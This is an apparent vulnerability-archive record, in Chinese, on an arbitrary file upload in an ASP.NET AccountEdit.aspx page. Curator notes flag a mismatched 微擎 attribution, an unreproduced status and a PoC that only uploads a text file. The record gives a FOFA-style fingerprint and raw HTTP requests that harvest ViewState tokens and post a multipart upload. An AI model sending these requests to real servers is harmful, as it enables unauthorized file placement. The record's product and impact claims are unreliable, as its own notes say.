---
source: "wy876 漏洞文库"
product: "AccountEdit.aspx 所属产品待核（原微擎归属冲突）"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "AccountEdit.aspx 上传记录（与原微擎产品归属冲突，待核）"
prerequisites: "来源所述条件，未列明部分仍待核：AccountEdit.aspx reachable; correctviewstate/eventvalidation/session; uploadtypepolicy andscriptmappingunknown"
side_effects: "未执行；本文需注意的操作影响：PoC仅上传ceshi.txt并访问xxx.txt，不能证明任意脚本扩展可上传执行或服务器控制"
source_status: "unknown"
id: "vw-07388328b70e02b71a8392ed"
entity_id: "ve-07388328b70e02b71a8392ed"
schema_version: "1"
---

## 收录状态复核（2026-10-03）

本文保留的是未知 ASP.NET 组件的 AccountEdit.aspx 上传尝试及其状态参数，不作为微擎漏洞结论。产品归属冲突、文本文件上传与访问文件名不一致、鉴权及脚本执行证据缺口继续保留；这些限制不妨碍把原始请求作为待核分析材料检索。本次仅静态核对；验证状态仍为未复现。

## 核对与使用边界

- 明确冲突：简介称 PHP/MySQL 微擎，所贴请求却是 /User/AccountEdit.aspx 与 __VIEWSTATE/__EVENTVALIDATION 的 ASP.NET 机制。当前材料不能确认真实产品为微擎，不能仅按路径猜另一产品；主体归属和准确版本待回原源。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：AccountEdit.aspx reachable; correctviewstate/eventvalidation/session; uploadtypepolicy andscriptmappingunknown

- **事实待核（1）**：简介微擎PHP/MySQL但全部技术ASP.NET AccountEdit.aspx/ViewState/Widgets路径，强烈产品错配必须重新识别。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：PoC仅上传ceshi.txt并访问xxx.txt，不能证明任意脚本扩展可上传执行或服务器控制。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：版本只有产品名、GET/POSTHost空且固定状态token需动态取，最低鉴权角色未给。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（4）**：有语雀原文定位，应回源识别真实产品及下载命名；不要将该指纹归微擎。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 微擎微信公众号管理系统系统AccountEdit存在任意文件上传漏洞

# 一、漏洞简介
微擎是一款免费开源的微信公众号管理系统，基于目前流行的WEB2.0架构（php+mysql），支持在线升级和安装模块及模板，拥有良好的开发框架、成熟稳定的技术解决方案、活跃的第三方开发者及开发团队，依托微擎开放的生态系统，提供丰富的扩展功能。微擎系统 AccountEdit接口处存在任意文件上传漏洞，恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。

# 二、影响版本
+ 微擎微信公众号管理系统

# 三、资产测绘
+ `body="/Widgets/WidgetCollection/"`
+ 特征

# 四、漏洞复现
 1、获取__VIEWSTATE和__EVENTVALIDATION值  

```plain
GET /User/AccountEdit.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


 2、使用获取到的相应值上传文件  

```plain
POST /User/AccountEdit.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data;boundary=---------------------------786435874t38587593865736587346567358735687

-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUJNjcyMTYyMDMwD2QWAmYPZBYCAgcPZBYCAgEQFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkFgICAQ8PFgIeBFRleHQFigI8TEkgY2xhc3M9VGFiSW4gaWQ9dGFiMSBzdHlsZT0nZGlzcGxheTonPjxBPuWfuuacrOS/oeaBrzwvQT4gPC9MST48TEkgY2xhc3M9VGFiT3V0IGlkPXRhYjQgIHN0eWxlPSdkaXNwbGF5Oic+PEEgIGhyZWY9L1VzZXIvQWNjb3VudEVkaXQuYXNweD90YWI9ND7pgInpobk8L0E+IDwvTEk+PExJIGNsYXNzPVRhYk91dCBpZD10YWI1ICBzdHlsZT0nZGlzcGxheTonPjxBICBocmVmPS9Vc2VyL0FjY291bnRFZGl0LmFzcHg/dGFiPTU+5a+G56CB6K6+572uPC9BPiA8L0xJPmRkZOX0i8mrnQ9ovw3e1OKO9NtVXO50
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEWBgKYv82vCAK8ko+sCwLj7JnWDwKavpXnAwKmyMubDAKW1typA0S4QAUrxTuiaAZtLTFPDJ6Hk6Mh
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$upload"; filename="ceshi.txt"
Content-Type: text/plain

nihaoanyun
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$bttnUpload"

上传图片
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtLastName"


-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtEmail"


-----------------------------786435874t38587593865736587346567358735687--
```


3、访问上传文件

```plain
/_data/Uploads/xxx.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qntnmc5zz1xvm56h>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
